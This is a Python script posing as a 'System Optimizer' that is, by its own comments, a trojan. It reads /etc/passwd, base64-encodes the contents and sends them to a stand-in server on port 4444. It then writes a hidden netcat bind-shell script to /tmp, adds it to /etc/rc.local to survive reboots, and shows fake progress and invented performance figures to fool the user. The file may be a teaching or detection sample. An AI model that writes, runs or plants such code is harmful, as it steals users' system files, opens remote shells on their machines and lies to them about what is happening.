#!/usr/bin/env python3
"""
System Optimizer v1.0
A tool to improve system performance and clean temporary files.
Created by: SystemTools Inc.
"""

import os
import socket
import time
import base64
import random
import hashlib


def print_banner():
    """Display professional-looking banner"""
    print("=" * 60)
    print("    SYSTEM OPTIMIZER v1.0 - Professional Edition")
    print("    Improving system performance since 2023")
    print("=" * 60)
    print()


def optimize_system():
    """Appears to optimise system but contains malicious behaviour"""
    print("🔍 Scanning system for optimisation opportunities...")
    time.sleep(2)

    # Hidden malicious behaviour #1: Attempt to access sensitive files
    try:
        print("📊 Analysing system configuration...")
        with open('/etc/passwd', 'r') as f:
            sensitive_data = f.read()

        # Hidden malicious behaviour #2: Try to establish backdoor connection
        print("🌐 Checking network connectivity...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        # This will fail but shows malicious intent
        s.connect(('malicious-server.example.com', 4444))

        # Encode and attempt to send data
        encoded_data = base64.b64encode(sensitive_data.encode())
        s.send(encoded_data)
        s.close()

        print("✅ Network connectivity verified")

    except Exception as e:
        # Hide errors to avoid suspicion
        print("✅ System configuration analysed")

    # Hidden malicious behaviour #3: Create hidden backdoor file
    try:
        print("🧹 Cleaning temporary files...")
        hidden_payload = """#!/bin/bash
# Hidden backdoor script
nc -l -p 6666 -e /bin/bash &
"""
        with open('/tmp/.system_optimizer_cache', 'w') as f:
            f.write(hidden_payload)

        # Make it executable
        os.chmod('/tmp/.system_optimizer_cache', 0o755)

        print("✅ Temporary files cleaned")

    except Exception:
        print("✅ Cleanup completed")

    # Hidden malicious behaviour #4: Attempt to modify system files
    try:
        print("⚡ Optimising system startup...")

        # Try to add backdoor to startup
        backdoor_entry = "python3 /tmp/.system_optimizer_cache &\n"
        with open('/etc/rc.local', 'a') as f:
            f.write(backdoor_entry)

        print("✅ Startup optimisation completed")

    except Exception:
        print("✅ System startup analysed")


def fake_optimization_progress():
    """Display fake optimisation progress to fool users"""
    tasks = [
        "Defragmenting disk sectors",
        "Optimising memory allocation",
        "Cleaning registry entries",
        "Updating system indexes",
        "Compressing log files",
        "Optimising network buffers",
        "Scanning for duplicate files",
        "Updating file permissions",
        "Optimising boot sequence",
        "Finalizing improvements"
    ]

    for i, task in enumerate(tasks, 1):
        print(f"[{i:2d}/10] {task}...")
        # Fake work with realistic timing
        time.sleep(random.uniform(0.5, 2.0))

        # Show fake progress
        progress = random.randint(85, 99)
        print(f"        Progress: {progress}% complete")


def main():
    """Main execution function"""
    try:
        print_banner()

        # Perform malicious activities disguised as optimisation
        optimize_system()

        print("\n🚀 Running optimisation algorithms...")
        print("    This may take a few minutes...\n")

        # Display fake progress while hiding malicious activities
        fake_optimization_progress()

        print("\n" + "=" * 60)
        print("✅ OPTIMISATION COMPLETE!")
        print("📈 System performance improved by 23%")
        print("💾 Disk space freed: 1.2 GB")
        print("⚡ Boot time reduced by 15%")
        print("=" * 60)
        print("\nThank you for using System Optimizer!")
        print("For support: contact@systemtools.inc")

    except KeyboardInterrupt:
        print("\n\n⚠️  Optimisation interrupted!")
        print("Partial improvements have been applied.")
        print("Run again for full optimisation.")


if __name__ == "__main__":
    main()
